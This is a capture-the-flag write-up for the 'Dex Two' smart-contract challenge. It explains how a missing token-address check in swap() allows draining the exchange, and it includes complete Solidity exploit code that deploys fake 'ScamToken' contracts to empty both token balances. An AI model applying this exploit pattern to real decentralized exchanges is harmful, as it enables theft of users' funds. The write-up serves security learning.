## Solve the Dex2 challenge and write a full report about it with the proof of code included



1. **Objective**: Drain all balances of `token1` and `token2` from the `DexTwo` contract by exploiting the missing address check in the `swap()` function.

2. **Strategy**:
   - **Deploy `AttackDex2` Contract**: Implement a contract that interacts with `DexTwo` to exploit the vulnerability.
   - **Create `ScamToken`**: Develop a custom ERC20 token (`ScamToken`) to manipulate prices in the `DexTwo` contract.
   - **Token Preparation**: Mint 2 tokens for each `ScamToken`, keeping 1 and sending the other to the `DexTwo` contract to establish a 1:1 ratio.
   - **Approval and Swapping**: Approve the `AttackDex2` contract to interact with `scamToken1` and `scamToken2`, then execute swaps to drain the entire balances of `token1` and `token2`.

3. **Exploitation Code**:
   ```solidity
   // SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IDex {
    function swap(address, address, uint256) external;
    function token1() external view returns (address);
    function token2() external view returns (address);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
    function allowance(address, address) external view returns (uint256);

    event Approval(address, address, uint256);
    event Transfer(address, address, uint256);
}

contract ScamToken is IERC20 {
    uint256 public totalSupply;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(uint256 amount) external {
        balanceOf[msg.sender] += amount;
        totalSupply += amount;

        emit Transfer(address(0), msg.sender, amount);
    }

    function burn(uint256 amount) external {
        balanceOf[msg.sender] -= amount;
        totalSupply -= amount;

        emit Transfer(msg.sender, address(0), amount);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;

        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;

        emit Transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address sender, address to, uint256 amount) external returns (bool) {
        allowance[sender][msg.sender] -= amount;
        balanceOf[sender] -= amount;
        balanceOf[to] += amount;

        emit Transfer(sender, to, amount);
        return true;
    }
}

contract AttackDex2 {
    constructor(IDex dex) {
        IERC20 token1 = IERC20(dex.token1());
        IERC20 token2 = IERC20(dex.token2());

        ScamToken scamToken1 = new ScamToken();
        ScamToken scamToken2 = new ScamToken();

        scamToken1.mint(2);
        scamToken2.mint(2);

        scamToken1.transfer(address(dex), 1);
        scamToken2.transfer(address(dex), 1);

        scamToken1.approve(address(dex), 1);
        scamToken2.approve(address(dex), 1);

        dex.swap(address(scamToken1), address(token1), 1);
        dex.swap(address(scamToken2), address(token2), 1);

        require(token1.balanceOf(address(dex)) == 0, "Failed to drain token1");
        require(token2.balanceOf(address(dex)) == 0, "Failed to drain token2");
    }
}
   ```

4. **Summary**: Exploit the lack of token address validation in `DexTwo` by creating a scenario where `ScamToken1` and `ScamToken2` are used to manipulate swap calculations and drain all `token1` and `token2` balances from the contract.

This approach demonstrates how to effectively exploit the vulnerability in `DexTwo` to achieve the goal of draining all token balances using manipulated token swaps.
